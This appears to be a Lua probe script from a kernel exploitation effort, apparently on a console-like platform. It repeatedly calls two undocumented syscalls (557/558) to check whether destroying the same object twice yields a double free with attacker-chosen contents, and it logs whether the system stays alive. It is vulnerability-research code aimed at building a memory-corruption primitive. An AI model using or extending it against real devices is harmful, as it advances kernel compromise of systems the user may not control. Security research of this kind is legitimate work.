-- CRASH_CLASS: HIGH
-- PROBE 785a: is 558 idempotent? A deterministic double free beats a race
--
-- 784a: create, create, create, destroy, destroy, destroy - all clean, and a
-- payload of all 0xFF pointers never faulted, so the 32 bytes are opaque.
-- Now: destroy the same id twice, and destroy an id while its job may still
-- be in flight. If the second destroy frees the 0x20 chunk again, we have a
-- double free with user-chosen contents and no timing at all.
print("=== PROBE 785a: SYS 558 DOUBLE ===")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a)
    a=to_num(a)
    if a<0 then a=a+18446744073709551616 end
    return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296))
end
local function call(sc,a1,a2,a3,a4,a5,a6)
    local ok,r=pcall(function() return sc(U(a1),U(a2),U(a3),U(a4),U(a5),U(a6)) end)
    if not ok then return "ERR" end
    return to_num(r)
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function zero(a,n) pcall(function() for i=0,n-8,8 do memory.write_qword(a+i,0) end end) end
local function alive() return tostring(call(mk(20),0,0,0,0,0,0)) end
local page=to_num(memory.alloc(0x2000)); zero(page,0x2000)
for i=0,7 do wd(page+i*4, 0x42424242+i) end
local function new(tag)
    local r=call(mk(557),page,0x1000,0,0,0,0)
    print(string.format("[A] 557(%s)=%s alive=%s",tag,tostring(r),alive()))
    return r
end
local function kill(id,label)
    local r=call(mk(558),id,0,0,0,0,0)
    print(string.format("[B] 558(%s)%s=%s alive=%s",tostring(id),label or "",tostring(r),alive()))
    return r
end
local id1=new("one")
kill(id1," first")
kill(id1," second")
kill(id1," third")
local id2=new("two")
local id3=new("three")
kill(id2," first")
kill(id2," second")
kill(id3," first")
kill(id3," second")
-- [C] create without destroy: how many before the family stops?
local created,last=0,nil
for i=1,24 do
    local r=call(mk(557),page,0x1000,0,0,0,0)
    if type(r)=="number" and r>0 then created=created+1 last=r else break end
end
print(string.format("[C] created-without-destroy=%d last=%s alive=%s",created,tostring(last),alive()))
-- [D] destroy them all again, twice each, to see the free list cope
local z=0
for i=1,2 do
    for j=0,created-1 do
        if type(last)=="number" then
            local cand=last-j
            if call(mk(558),cand,0,0,0,0,0)==0 then z=z+1 end
        end
    end
end
print(string.format("[D] mass destroy hits=%d alive=%s",z,alive()))
print("=== 785a DONE ===")
